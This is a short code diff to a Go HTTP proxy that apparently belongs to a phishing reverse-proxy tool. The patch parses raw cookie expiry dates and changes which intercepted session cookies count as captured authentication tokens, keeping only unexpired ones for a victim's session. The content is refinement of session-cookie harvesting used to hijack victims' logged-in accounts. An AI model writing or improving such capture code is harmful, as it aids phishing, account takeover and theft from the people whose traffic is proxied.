@@ -657,6 +657,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			resp.Header.Del("Set-Cookie")
 			for _, ck := range cookies {
 				// parse cookie
+
+				if len(ck.RawExpires) > 0 && ck.Expires.IsZero() {
+					exptime, err := time.Parse(time.RFC850, ck.RawExpires)
+					if err != nil {
+						exptime, err = time.Parse(time.ANSIC, ck.RawExpires)
+						if err != nil {
+							exptime, err = time.Parse("Monday, 02-Jan-2006 15:04:05 MST", ck.RawExpires)
+						}
+					}
+					ck.Expires = exptime
+				}
+
 				if pl != nil && ps.SessionId != "" {
 					c_domain := ck.Domain
 					if c_domain == "" {
@@ -671,7 +683,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					if pl.isAuthToken(c_domain, ck.Name) {
 						s, ok := p.sessions[ps.SessionId]
 						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" { // cookies with empty values are of no interest to us
+							if ck.Value != "" && (!ck.Expires.IsZero() && time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								is_auth = s.AddAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, auth_tokens)
 								if len(pl.authUrls) > 0 {
 									is_auth = false
